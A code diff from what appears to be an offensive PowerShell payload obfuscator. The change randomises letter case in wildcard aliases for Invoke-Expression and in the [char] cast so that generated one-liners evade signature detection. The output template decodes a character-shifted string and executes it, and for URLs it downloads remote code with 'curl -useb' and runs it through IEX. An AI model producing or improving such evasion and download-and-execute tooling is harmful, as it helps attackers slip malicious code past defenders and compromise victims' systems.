@@ -53,14 +53,15 @@ Do{
 
     Write-Host "`nHere's your obfuscated payload!`n" 
 
-    $invokes = @('(ga`l ?[?e]x)','(gal ?[?e]x)','(gcm ?[?e]x)','(gcm ?[?e]x)','(gal ?e[?x])','(gcm ?e[?x])','(`ga`l i?[?x])','(g`cm i?[?x])')
+    $aA = @("a","A") | Get-Random;$aB = @("b","B") | Get-Random;$aC = @("c","C") | Get-Random;$aD = @("d","D") | Get-Random;$aE = @("e","E") | Get-Random;$aF = @("f","F") | Get-Random;$aG = @("g","G") | Get-Random;$aH = @("h","H") | Get-Random;$aI = @("i","I") | Get-Random;$aJ = @("j","J") | Get-Random;$aK = @("k","K") | Get-Random;$aL = @("l","L") | Get-Random;$aM = @("m","M") | Get-Random;$aN = @("n","N") | Get-Random;$aO = @("o","O") | Get-Random;$aP = @("p","P") | Get-Random;$aQ = @("q","Q") | Get-Random;$aR = @("r","R") | Get-Random;$aS = @("s","S") | Get-Random;$aT = @("t","T") | Get-Random;$aU = @("u","U") | Get-Random;$aV = @("v","V") | Get-Random;$aW = @("w","W") | Get-Random;$aX = @("x","X") | Get-Random;$aY = @("y","Y") | Get-Random;$aZ = @("z","Z") | Get-Random
+    $invokes = @("($aG$aA``$aL ?[?$aE]$aX)","($aG``$aA$aL ?[?$aE]$aX)","($aG$aC``$aM ?[?$aE]$aX)","($aG``$aC$aM ?[?$aE]$aX)","($aG$aA``$aL ?$aE[?$aX])","($aG``$aC$aM ?$aE[?$aX])","(``$aG$aA``$aL $aI`?[?$aX])","($aG``$aC$aM $aI`?[?$aX])")
 
     function CalcPayload() {
         $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
         if($tochar -clike 'http*') {
-            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
+            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_-" + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
         } else {
-            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
+            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + "+[$aC$aH$aA$aR](`$_-" + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
         }
     }
 
